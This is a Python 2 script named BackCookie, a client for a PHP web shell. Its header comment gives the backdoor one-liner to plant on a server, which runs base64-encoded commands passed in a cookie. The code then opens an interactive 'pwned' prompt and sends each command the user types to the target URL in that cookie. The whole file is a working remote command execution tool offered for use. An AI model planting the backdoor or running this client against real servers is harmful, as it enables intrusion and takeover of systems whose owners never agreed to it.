#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2013 - 2014 @mrjopino  <mrjopino@gmail.com>
#    
# 
###############################################
import os                                     #
import sys                                    #
from sys import argv                          #
from urllib2 import build_opener, HTTPHandler #
############################################################################
#                                                                          #
# Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> #
# It goes with a range from 1 to 0, but you can customize the parameter.   #
# Example: python backcookie.py http://target.com/shell.php                #
#                                                                          #
# You can change the name of the cookie, in line 37.                       #
# a value of 1 for the name of your cookie, also in php.                   #
# Example: system(base64_decode($_COOKIE["yourcookie"]));                  #####
# so that the connection is successful.                                        #
#                                                                              #
# Backcookie is like the people who finds the love of his life every 2 months. #
################################################################################
#
#BackCookie
#
if "linux" in sys.platform:
    os.system("clear")
elif "win" in sys.platform:
    os.system("cls")
else:
    pass

# Name of the cookie
cookie = "1"

# colors
class color:
    azul = '\033[94m'
    rojo = '\033[91m'
    verde = '\033[92m'
    blanco = '\033[0m'

# class of header and encode
class core:
    bc = 'Backcookie'
    ua = 'User-Agent'
    ck = 'Cookie'
    vc = '={0}'
    eb = 'base64'

def backcookie(c, a, debugLevel=0): # c is command & a is agent
    o = build_opener(HTTPHandler(debuglevel=debugLevel))
    o.addheaders = [
        (core.ua, a),
        (core.ck, cookie + core.vc.format(c.encode(core.eb)))
    ]
    l = o.open(argv[1])
    print color.azul + l.read().strip() + color.blanco

def main():
    print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
    print "\t\t+    Developed by: @mrjopino      +"
    print "\t\t+             To play             +"
    print "\t\t-----------------------------------\n\n"
    print color.verde + "[+] " + color.azul  + "Happy hacking" + color.blanco
    print color.verde + "[+] " + color.azul  + "Sometimes it is not positive, but sometimes if!\n" + color.blanco

    a = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; "
    a = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; "
    a = "WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; "
    a = ".NET CLR 3.0.30729; .NET CLR 3.5.30729; "
    a = "Media Center PC 6.0; .NET4.0C; .NET4.0E; "
    a = "Mozilla/5.0 (Windows; U; Windows NT 5.1; "
    a = "Mozilla/5.0 (Windows; U; Windows NT 6.0; "
    a = "Mozilla/5.0 (X11; U; Linux i686; "
    a = "Mozilla/5.0 (Android; Mobile; "
    a = "Mozilla/5.0 (Android; Tablet; "

    while True:
        
        c = raw_input("pwned:~$ ")
        if c != "exit": #exit console backcookie
            backcookie(c, a)
        else:
            print "\t\t-------------\033[94mDeveloper\033[0m------------"
            print "\t\t+        José Pino (Fraph)       +"
            print "\t\t+       Security researcher      +"
            print "\t\t+            @mrjopino           +"
            print "\t\t----------------------------------\n\n"
            print color.azul + "[-] " + color.rojo + core.bc + " OFF\n" + color.blanco
            break

if __name__ == "__main__":
    main()
